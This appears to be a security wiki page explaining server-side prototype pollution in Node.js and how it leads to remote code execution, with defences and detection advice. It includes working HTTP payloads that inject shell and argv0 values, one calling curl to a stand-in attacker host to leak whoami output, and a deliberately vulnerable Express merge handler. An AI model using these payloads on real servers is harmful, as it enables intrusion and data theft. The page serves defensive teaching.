---
title: Server-Side Prototype Pollution to RCE
slug: prototype-pollution-server-side
---

> **TL;DR:** Polluting `Object.prototype` via Express body parsing or merge utilities turns reachable gadgets in lodash, Kibana, and child_process into remote code execution.

## What it is
JavaScript objects inherit from `Object.prototype`; mutating that shared prototype with attacker-controlled keys (`__proto__`, `constructor.prototype`) injects properties seen by every object in the process. Server-side, this is usually triggered by a recursive merge/clone (`lodash.merge`, `Object.assign` of parsed JSON, `qs`-parsed query strings) applied to user input. Pollution alone is harmless; impact comes from gadgets — code paths that read an option from an object expecting a default, where injecting a value alters control flow. The canonical sinks reach `child_process.spawn`/`exec` argument arrays, template engine option bags, or import paths.

## Preconditions / where it applies
- Sink processes JSON or query strings into a deep merge: Express + `body-parser` JSON, `qs` with `allowPrototypes: true` or pre-2017 versions, custom `Object.assign` loops, `lodash.merge` < 4.17.12, `lodash.set` < 4.17.20
- A reachable gadget after pollution: `child_process.spawn` (Node ≥ 10 reads `options.shell`, `options.env`, `options.argv0`), Handlebars/Pug compile, Kibana's `TimelionRequestHandler`, NestJS validators
- Endpoint accepts JSON body or merges nested query strings

## Technique
Polluting via JSON body to an Express route doing a merge:

```http
POST /api/profile HTTP/1.1
Host: target.example
Content-Type: application/json

{"__proto__":{"shell":"/bin/sh","argv0":"id; curl https://attacker.example/$(whoami)"}}
```

Vulnerable handler shape:

```javascript
app.post("/api/profile", (req, res) => {
  const user = {};
  merge(user, req.body); // lodash.merge or hand-rolled recursive merge
  db.save(user);
  res.json({ok: true});
});
```

Now any later `spawn` in the same process reads the polluted defaults:

```javascript
const { spawn } = require("child_process");
spawn("echo", ["hi"]); // reads Object.prototype.shell -> /bin/sh -c, argv0 injection
```

The Kibana CVE-2019-7609 gadget chain polluted `process.env.NODE_OPTIONS` so the next `child_process.fork` evaluated `--require /tmp/rce.js`. A modern variant pollutes `Object.prototype.NODE_OPTIONS` directly, since Node copies `process.env` plus an options bag when spawning.

Query-string variant exploiting `qs`:

```http
GET /search?__proto__[shell]=/bin/sh&__proto__[argv0]=touch%20/tmp/pwn HTTP/1.1
Host: target.example
```

Detection PoC — read back a polluted property after sending the payload:

```http
POST /api/profile HTTP/1.1
Content-Type: application/json

{"__proto__":{"polluted":"yes"}}
```

```http
GET /api/whoami HTTP/1.1
```

A response that includes `"polluted":"yes"` despite no such property being set proves pollution.

## Detection and defence
- Freeze `Object.prototype` at boot: `Object.freeze(Object.prototype); Object.freeze(Array.prototype);`
- Use `Object.create(null)` for option bags and parsed bodies
- Upgrade `lodash` to ≥ 4.17.21 and avoid `_.merge`/`_.set`/`_.defaultsDeep` on untrusted input; prefer `structuredClone` + explicit allowlists
- Use Express body-parser with `protoAction: "remove"` (qs ≥ 6.6) and reject keys matching `^(__proto__|constructor|prototype)$` at the edge
- Run Node with `--disable-proto=delete` to remove the `__proto__` accessor
- Static analysis: `eslint-plugin-security`, Semgrep `javascript.lang.security.audit.prototype-pollution`
- Alert on bodies and query strings containing `__proto__`, `constructor.prototype`, `prototype.`

## References
- [Olivier Arteau — Prototype pollution attacks in NodeJS](https://github.com/HoLyVieR/prototype-pollution-nsec18) — original research
- [PortSwigger — Server-side prototype pollution](https://portswigger.net/research/server-side-prototype-pollution) — modern detection methodology

See also: [[prototype-pollution]], [[deserialisation]], [[rce-class]], [[command-injection]].
